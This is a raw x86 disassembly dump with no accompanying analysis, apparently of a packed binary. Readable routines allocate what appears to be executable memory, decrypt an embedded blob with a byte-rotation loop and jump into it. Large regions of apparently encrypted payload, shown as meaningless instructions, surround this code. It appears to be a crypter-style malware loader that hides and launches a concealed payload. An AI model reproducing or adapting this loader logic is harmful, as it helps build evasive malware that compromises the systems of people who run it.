  4213ab:	sbb    DWORD PTR [ebp-0x4ffc494e],edi
  4213b1:	jecxz  0x4213c9
  4213b3:	and    al,0xce
  4213b5:	sub    DWORD PTR [ecx-0xd],0x2baab206
  4213bc:	pop    edx
  4213bd:	je     0x421418
  4213bf:	aaa    
  4213c0:	sbb    cl,BYTE PTR [esi]
  4213c2:	out    dx,eax
  4213c3:	arpl   WORD PTR [esi],bx
  4213c5:	imul   ebx,eax,0x3c
  4213c8:	inc    esp
  4213c9:	sbb    DWORD PTR [ebp-0x35da42d5],eax
  4213cf:	loopne 0x421369
  4213d1:	cmp    ch,BYTE PTR ds:0xedae8a49
  4213d7:	push   cs
  4213d8:	jae    0x421429
  4213da:	xor    eax,0xa586d8ee
  4213df:	jbe    0x421387
  4213e1:	xchg   esp,eax
  4213e2:	arpl   WORD PTR gs:0xdacced1f,bp
  4213e9:	xor    al,BYTE PTR [ecx-0x2922dbfe]
  4213ef:	cld    
  4213f0:	cwde   
  4213f1:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4213f3:	loop   0x4213d5
  4213f5:	pop    edi
  4213f6:	xchg   DWORD PTR [esi+eiz*1],esp
  4213f9:	cwde   
  4213fa:	clc    
  4213fb:	je     0x42146b
  4213fd:	dec    ecx
  4213fe:	and    BYTE PTR [edx+0xf1ae6fa],al
  421404:	add    DWORD PTR [edx],ebp
  421406:	and    edi,esp
  421408:	jl     0x4213d4
  42140a:	in     eax,dx
  42140b:	stos   BYTE PTR es:[edi],al
  42140c:	xchg   ebx,eax
  42140d:	mov    BYTE PTR [esp+edi*4+0x52],ch
  421411:	(bad)  
  421412:	pushf  
  421413:	push   cs
  421414:	mov    esi,0x4757fb29
  421419:	retf   
  42141a:	mov    edi,0xb65a488f
  42141f:	repz or BYTE PTR [edi],bh
  421422:	push   0x1f77a987
  421427:	or     dh,BYTE PTR [esi+0x26]
  42142a:	mov    cl,0x7c
  42142c:	cli    
  42142d:	xor    ch,BYTE PTR [ebx-0x10]
  421430:	jns    0x421435
  421432:	add    edx,DWORD PTR [ebx+0x2a]
  421435:	mov    ebx,0x7cbc69ef
  42143a:	cmp    eax,0x9b502fea
  42143f:	cli    
  421440:	mov    al,ds:0xa6d4220e
  421445:	inc    edi
  421446:	push   0x81b058ec
  42144b:	test   eax,0xce731e28
  421450:	push   edi
  421451:	int3   
  421452:	xchg   esp,eax
  421453:	or     eax,0x9891d2ed
  421458:	inc    esi
  421459:	sub    ch,BYTE PTR [ecx+ebx*1]
  42145c:	sbb    eax,0xda4d2593
  421461:	aam    0x5f
  421463:	xor    ebp,esp
  421465:	fistp  DWORD PTR [eax-0x4b]
  421468:	add    al,BYTE PTR ds:0xeb701fd1
  42146e:	jmp    0x3d6f:0xe7ad237
  421475:	outs   dx,BYTE PTR ds:[esi]
  421476:	out    0x90,al
  421478:	stos   BYTE PTR es:[edi],al
  421479:	sub    eax,0x7d36c6de
  42147e:	add    al,0x59
  421480:	mov    ebp,0x165d71ce
  421485:	leave  
  421486:	rcr    BYTE PTR [ebx-0x52ed9b9f],0x2b
  42148d:	sbb    DWORD PTR ds:0x66535714,0x5b9e60bc
  421497:	das    
  421498:	mov    dl,0x20
  42149a:	sub    BYTE PTR [ebx+0x29],ah
  42149d:	rol    BYTE PTR [ecx+0x532913c6],1
  4214a3:	ret    
  4214a4:	mov    cl,0xb1
  4214a6:	sbb    al,0xb6
  4214a8:	mov    eax,ds:0x9adb1de7
  4214ad:	inc    esi
  4214ae:	dec    ebp
  4214af:	mov    al,ds:0x71577fa6
  4214b4:	int    0xe1
  4214b6:	pusha  
  4214b7:	outs   dx,DWORD PTR ds:[esi]
  4214b8:	xchg   edx,eax
  4214b9:	in     eax,0x55
  4214bb:	jmp    0x4214b1
  4214bd:	push   ds
  4214be:	mov    dh,0x67
  4214c0:	into   
  4214c1:	xchg   edx,eax
  4214c2:	cmc    
  4214c3:	ins    DWORD PTR es:[edi],dx
  4214c4:	in     eax,0xe1
  4214c6:	repz mov WORD PTR [eax+0x33],gs
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0xee9e7
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0x6f099e39
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	push   ebx
  42182f:	loope  0x42188d
  421831:	mov    ecx,0xed4497af
  421836:	xor    al,0x48
  421838:	add    esp,DWORD PTR [edx+edx*4+0x41]
  42183c:	mov    ebx,0x97ac01cc
  421841:	inc    esp
  421842:	in     eax,dx
  421843:	xor    BYTE PTR [eax+0x3],cl
  421846:	and    al,0x6d
  421848:	mov    esi,0xacb9ccbb
  42184d:	xchg   edi,eax
  42184e:	inc    esp
  42184f:	in     eax,dx
  421850:	xor    BYTE PTR [eax+0x3],cl
  421853:	fs ins DWORD PTR es:[edi],dx
  421855:	mov    esi,0xacb9ccbb
  42185a:	xchg   edi,eax
  42185b:	inc    esp
  42185c:	in     eax,dx
  42185d:	xor    BYTE PTR [eax+0x3],cl
  421860:	fs ins DWORD PTR es:[edi],dx
  421862:	mov    esi,0xacb9ccbb
  421867:	xchg   edi,eax
  421868:	inc    esp
  421869:	in     eax,dx
  42186a:	enter  0x348,0x64
  42186e:	arpl   WORD PTR [ecx+0x18b9c201],sp
  421874:	sahf   
  421875:	mov    esp,ecx
  421877:	mov    BYTE PTR [ecx+0x4f],cl
  42187a:	test   eax,0xa5d3ea4c
  42187f:	retf   0xe78c
  421882:	adc    BYTE PTR ss:[edi+0x3a],0x62
  421887:	or     DWORD PTR [ebp-0x23],ecx
  42188a:	fisub  DWORD PTR [edx+0x64e3c3d7]
  421890:	(bad)  
  421891:	push   ebp
  421892:	push   0x9e031171
  421897:	shl    BYTE PTR [edx+0x17d8e899],cl
  42189d:	int    0x5d
  42189f:	daa    
  4218a0:	add    DWORD PTR [bp+di-0x4d],eax
  4218a4:	mov    dh,0xc6
  4218a6:	popf   
  4218a7:	lods   al,BYTE PTR ds:[esi]
  4218a8:	xchg   edi,eax
  4218a9:	inc    esp
  4218aa:	in     eax,dx
  4218ab:	xor    BYTE PTR [eax+0x3],cl
  4218ae:	arpl   sp,si
  4218b0:	inc    edx
  4218b1:	loop   0x421842
  4218b3:	inc    ecx
  4218b4:	ds popf 
  4218b6:	pop    es
  4218b7:	adc    eax,0x9c4042a2
  4218bc:	push   DWORD PTR [ebx+eiz*8-0x37594a57]
  4218c3:	mov    esp,0x66103a7f
  4218c8:	pop    esp
  4218c9:	addr16 jl 0x42190f
  4218cc:	pop    esi
  4218cd:	mov    bl,0xf4
  4218cf:	bnd jge 0x4218b9
  4218d2:	pop    eax
  4218d3:	mov    al,0x91
  4218d5:	outs   dx,BYTE PTR ds:[esi]
  4218d6:	inc    ecx
  4218d7:	xor    BYTE PTR [edx+0x554ffc6],al
  4218dd:	dec    esi
  4218de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218df:	mov    al,0x59
  4218e1:	or     DWORD PTR [esi],ebp
  4218e3:	xchg   ebp,eax
  4218e4:	sub    al,0xb1
  4218e6:	xchg   BYTE PTR [ecx],bh
  4218e8:	lods   eax,DWORD PTR ds:[esi]
  4218e9:	popf   
  4218ea:	sbb    al,0x15
  4218ec:	mov    ds:0xfe9c4042,al
  4218f1:	mov    ah,0x93
  4218f3:	xor    eax,0x9c28a62b
  4218f8:	ins    DWORD PTR es:[edi],dx
  4218f9:	cmp    al,BYTE PTR ds:0xe667f6fb
  4218ff:	fdivrp st(1),st
  421901:	mov    bl,0xa4
  421903:	outs   dx,DWORD PTR ds:[esi]
  421904:	(bad)  
  421905:	out    0x68,eax
  421907:	sub    eax,0x462f6e0b
  42190c:	sub    esi,eax
  42190e:	loope  0x4218d9
  421910:	cwde   
  421911:	dec    esi
  421912:	scas   eax,DWORD PTR es:[edi]
  421913:	enter  0x9da,0x36
  421917:	add    al,0xdd
  421919:	ror    DWORD PTR [edi+0x449d3e41],cl
  42191f:	in     eax,dx
  421920:	xor    BYTE PTR [eax+0x3],cl
  421923:	fs ins DWORD PTR es:[edi],dx
  421925:	mov    esi,0xacb989eb
  42192a:	fild   DWORD PTR [ebp-0x11]
  42192d:	xor    al,ch
  42192f:	ror    DWORD PTR [edi],cl
  421931:	and    bh,BYTE PTR [esi-0x53463345]
  421937:	xchg   edi,eax
  421938:	inc    esp
  421939:	in     eax,dx
  42193a:	ror    BYTE PTR [eax+0x0],1
  42193d:	gs mov di,0xccb1
  421942:	mov    ecx,0xed449342
  421947:	mov    WORD PTR [esi+0x3],cs
  42194a:	fs ins DWORD PTR es:[edi],dx
  42194c:	mov    esi,0xac04ddbb
  421951:	xchg   edi,eax
  421952:	inc    esp
  421953:	std    
  421954:	xor    BYTE PTR [eax+0x3],cl
  421957:	fs push 0xf8ccbbbe
  42195d:	lods   al,BYTE PTR ds:[esi]
  42195e:	xchg   edi,eax
  42195f:	push   esp
  421960:	in     eax,dx
  421961:	xor    BYTE PTR [eax+0x1],cl
  421964:	fs ins DWORD PTR es:[edi],dx
  421966:	mov    ebx,0xacb9cdbb
  42196b:	xchg   edi,eax
  42196c:	inc    esp
  42196d:	in     eax,dx
  42196e:	xor    eax,0x6d640248
  421973:	mov    esi,0xfcb9ccbb
  421978:	fwait
  421979:	inc    esp
  42197a:	in     eax,dx
  42197b:	xor    al,0x48
  42197d:	add    esp,DWORD PTR [ebp-0x77]
  421980:	mov    ebx,0xacb9cebb
  421985:	pop    ss
  421986:	inc    esp
  421987:	in     eax,dx
  421988:	and    BYTE PTR [eax+0x3],cl
  42198b:	je     0x4219fa
  42198d:	mov    esi,0xaca9ccbb
  421992:	xchg   edi,eax
  421993:	push   esp
  421994:	in     eax,dx
  421995:	xor    BYTE PTR [eax+0x3],cl
  421998:	fs ins DWORD PTR es:[edi],dx
  42199a:	scas   al,BYTE PTR es:[edi]
  42199b:	mov    ebx,0x97acb9cc
  4219a0:	inc    esp
  4219a1:	in     eax,dx
  4219a2:	xor    BYTE PTR [eax+0x3],cl
  4219a5:	fs cdq 
  4219a7:	xchg   DWORD PTR [edi-0x68502f34],esi
  4219ad:	inc    esp
  4219ae:	in     eax,dx
  4219af:	rol    BYTE PTR [ebx+0x3],0x2b
  4219b3:	and    al,0xbe
  4219b5:	mov    ebx,0x97acb9cc
  4219ba:	inc    esp
  4219bb:	in     eax,dx
  4219bc:	xor    BYTE PTR [eax+0x3],cl
  4219bf:	fs ins DWORD PTR es:[edi],dx
  4219c1:	mov    esi,0xacb9ccbb
  4219c6:	xchg   edi,eax
  4219c7:	inc    esp
  4219c8:	in     eax,dx
  4219c9:	xor    BYTE PTR [eax+0x3],cl
  4219cc:	fs ins DWORD PTR es:[edi],dx
  4219ce:	mov    esi,0xacb9ccbb
  4219d3:	xchg   edi,eax
  4219d4:	inc    esp
  4219d5:	in     eax,dx
  4219d6:	xor    BYTE PTR [eax+0x3],cl
  4219d9:	fs ins DWORD PTR es:[edi],dx
  4219db:	mov    esi,0xacb9ccbb
  4219e0:	xchg   edi,eax
  4219e1:	inc    esp
  4219e2:	in     eax,dx
  4219e3:	xor    BYTE PTR [eax+0x3],cl
  4219e6:	fs ins DWORD PTR es:[edi],dx
  4219e8:	mov    esi,0xacb9ccbb
  4219ed:	xchg   edi,eax
  4219ee:	inc    esp
  4219ef:	in     eax,dx
  4219f0:	xor    BYTE PTR [eax+0x3],cl
  4219f3:	fs ins DWORD PTR es:[edi],dx
  4219f5:	mov    esi,0xacb9ccbb
  4219fa:	xchg   edi,eax
  4219fb:	inc    esp
  4219fc:	in     eax,dx
  4219fd:	xor    BYTE PTR [eax+0x3],cl
  421a00:	fs ins DWORD PTR es:[edi],dx
  421a02:	mov    esi,0xacb9ccbb
  421a07:	xchg   edi,eax
  421a08:	inc    esp
  421a09:	in     eax,dx
  421a0a:	xor    BYTE PTR [eax+0x3],cl
  421a0d:	fs ins DWORD PTR es:[edi],dx
  421a0f:	mov    esi,0xacb9ccbb
  421a14:	xchg   edi,eax
  421a15:	inc    esp
  421a16:	in     eax,dx
  421a17:	xor    BYTE PTR [eax+0x3],cl
  421a1a:	fs ins DWORD PTR es:[edi],dx
  421a1c:	mov    esi,0xc9cde2bb
  421a21:	out    dx,eax
  421a22:	xor    ch,ch
  421a24:	xor    BYTE PTR [eax+0x3],cl
  421a27:	test   BYTE PTR [esi-0x42],ah
  421a2a:	mov    ebx,0x97acb9dc
  421a2f:	nop
  421a30:	jmp    0x64496265
  421a35:	ins    DWORD PTR es:[edi],dx
  421a36:	out    dx,al
  421a37:	dec    BYTE PTR [edi+0x44d8f88b]
  421a3d:	in     eax,dx
  421a3e:	xor    BYTE PTR [eax+0x3],cl
  421a41:	fs dec ebp
  421a43:	mov    esi,0xde972cbb
  421a48:	in     al,0x36
  421a4a:	mov    ?,WORD PTR [eax]
  421a4c:	dec    eax
  421a4d:	add    esp,DWORD PTR [ebp+ecx*1-0x42]
  421a51:	mov    ebx,0x97a749cc
  421a56:	inc    esp
  421a57:	mov    bh,0x30
  421a59:	dec    eax
  421a5a:	add    edi,DWORD PTR [ecx+ebp*2-0x46334442]
  421a61:	lods   al,BYTE PTR ds:[esi]
  421a62:	xchg   edi,eax
  421a63:	inc    esp
  421a64:	in     eax,dx
  421a65:	xor    BYTE PTR [eax+0x3],cl
  421a68:	fs ins DWORD PTR es:[edi],dx
  421a6a:	sahf   
  421a6b:	mov    ebx,0x97ac59cc
  421a70:	inc    esp
  421a71:	in     eax,dx
  421a72:	xor    BYTE PTR [eax+0x3],cl
  421a75:	fs ins DWORD PTR es:[edi],dx
  421a77:	mov    esi,0xacb9ccbb
  421a7c:	xchg   edi,eax
  421a7d:	inc    esp
  421a7e:	in     eax,dx
  421a7f:	xor    BYTE PTR [eax+0x3],cl
  421a82:	fs ins DWORD PTR es:[edi],dx
  421a84:	mov    esi,0xacb9ccbb
  421a89:	xchg   edi,eax
  421a8a:	inc    esp
  421a8b:	in     eax,dx
  421a8c:	xor    BYTE PTR [eax+0x3],cl
  421a8f:	fs ins DWORD PTR es:[edi],dx
  421a91:	mov    esi,0xacb9ccbb
  421a96:	xchg   edi,eax
  421a97:	inc    esp
  421a98:	in     eax,dx
  421a99:	xor    BYTE PTR [eax+0x3],cl
  421a9c:	fs ins DWORD PTR es:[edi],dx
  421a9e:	mov    esi,0xacb9ccbb
  421aa3:	xchg   edi,eax
  421aa4:	inc    esp
  421aa5:	in     eax,dx
  421aa6:	xor    BYTE PTR [eax+0x3],cl
  421aa9:	fs ins DWORD PTR es:[edi],dx
  421aab:	mov    esi,0xacb9ccbb
  421ab0:	xchg   edi,eax
  421ab1:	inc    esp
  421ab2:	in     eax,dx
  421ab3:	xor    BYTE PTR [eax+0x3],cl
  421ab6:	fs ins DWORD PTR es:[edi],dx
  421ab8:	mov    esi,0xacb9ccbb
  421abd:	xchg   edi,eax
  421abe:	inc    esp
  421abf:	in     eax,dx
  421ac0:	xor    BYTE PTR [eax+0x3],cl
  421ac3:	fs ins DWORD PTR es:[edi],dx
  421ac5:	mov    esi,0xacb9ccbb
  421aca:	xchg   edi,eax
  421acb:	inc    esp
  421acc:	in     eax,dx
  421acd:	xor    BYTE PTR [eax+0x3],cl
  421ad0:	fs ins DWORD PTR es:[edi],dx
  421ad2:	mov    esi,0xacb9ccbb
  421ad7:	xchg   edi,eax
  421ad8:	inc    esp
  421ad9:	in     eax,dx
  421ada:	xor    BYTE PTR [eax+0x3],cl
  421add:	fs ins DWORD PTR es:[edi],dx
  421adf:	mov    esi,0xacb9ccbb
  421ae4:	xchg   edi,eax
  421ae5:	inc    esp
  421ae6:	in     eax,dx
  421ae7:	xor    BYTE PTR [eax+0x3],cl
  421aea:	fs ins DWORD PTR es:[edi],dx
  421aec:	mov    esi,0xacb9ccbb
  421af1:	xchg   edi,eax
  421af2:	inc    esp
  421af3:	in     eax,dx
  421af4:	xor    BYTE PTR [eax+0x3],cl
  421af7:	fs ins DWORD PTR es:[edi],dx
  421af9:	mov    esi,0xacb9ccbb
  421afe:	xchg   edi,eax
  421aff:	inc    esp
  421b00:	in     eax,dx
  421b01:	xor    BYTE PTR [eax+0x3],cl
  421b04:	fs ins DWORD PTR es:[edi],dx
  421b06:	mov    esi,0xacb9ccbb
  421b0b:	xchg   edi,eax
  421b0c:	inc    esp
  421b0d:	in     eax,dx
  421b0e:	xor    BYTE PTR [eax+0x3],cl
  421b11:	fs ins DWORD PTR es:[edi],dx
  421b13:	mov    esi,0xacb9ccbb
  421b18:	xchg   edi,eax
  421b19:	inc    esp
  421b1a:	in     eax,dx
  421b1b:	xor    BYTE PTR [eax+0x3],cl
  421b1e:	fs ins DWORD PTR es:[edi],dx
  421b20:	mov    esi,0xacb9ccbb
  421b25:	xchg   edi,eax
  421b26:	inc    esp
  421b27:	in     eax,dx
  421b28:	xor    BYTE PTR [eax+0x3],cl
  421b2b:	fs ins DWORD PTR es:[edi],dx
  421b2d:	mov    esi,0xacb9ccbb
  421b32:	xchg   edi,eax
  421b33:	inc    esp
  421b34:	in     eax,dx
  421b35:	xor    BYTE PTR [eax+0x3],cl
  421b38:	fs ins DWORD PTR es:[edi],dx
  421b3a:	mov    esi,0xacb9ccbb
  421b3f:	xchg   edi,eax
  421b40:	inc    esp
  421b41:	in     eax,dx
  421b42:	xor    BYTE PTR [eax+0x3],cl
  421b45:	fs ins DWORD PTR es:[edi],dx
  421b47:	mov    esi,0xacb9ccbb
  421b4c:	xchg   edi,eax
  421b4d:	inc    esp
  421b4e:	in     eax,dx
  421b4f:	xor    BYTE PTR [eax+0x3],cl
  421b52:	fs ins DWORD PTR es:[edi],dx
  421b54:	mov    esi,0xacb9ccbb
  421b59:	xchg   edi,eax
  421b5a:	inc    esp
  421b5b:	in     eax,dx
  421b5c:	xor    BYTE PTR [eax+0x3],cl
  421b5f:	fs ins DWORD PTR es:[edi],dx
  421b61:	mov    esi,0xacb9ccbb
  421b66:	xchg   edi,eax
  421b67:	inc    esp
  421b68:	in     eax,dx
  421b69:	xor    BYTE PTR [eax+0x3],cl
  421b6c:	fs ins DWORD PTR es:[edi],dx
  421b6e:	mov    esi,0xacb9ccbb
  421b73:	xchg   edi,eax
  421b74:	inc    esp
  421b75:	in     eax,dx
  421b76:	xor    BYTE PTR [eax+0x3],cl
  421b79:	fs ins DWORD PTR es:[edi],dx
  421b7b:	mov    esi,0xacb9ccbb
  421b80:	xchg   edi,eax
  421b81:	inc    esp
  421b82:	in     eax,dx
  421b83:	xor    BYTE PTR [eax+0x3],cl
  421b86:	fs ins DWORD PTR es:[edi],dx
  421b88:	mov    esi,0xacb9ccbb
  421b8d:	xchg   edi,eax
  421b8e:	inc    esp
  421b8f:	in     eax,dx
  421b90:	xor    BYTE PTR [eax+0x3],cl
  421b93:	fs ins DWORD PTR es:[edi],dx
  421b95:	mov    esi,0xacb9ccbb
  421b9a:	xchg   edi,eax
  421b9b:	inc    esp
  421b9c:	in     eax,dx
  421b9d:	xor    BYTE PTR [eax+0x3],cl
  421ba0:	fs ins DWORD PTR es:[edi],dx
  421ba2:	mov    esi,0xacb9ccbb
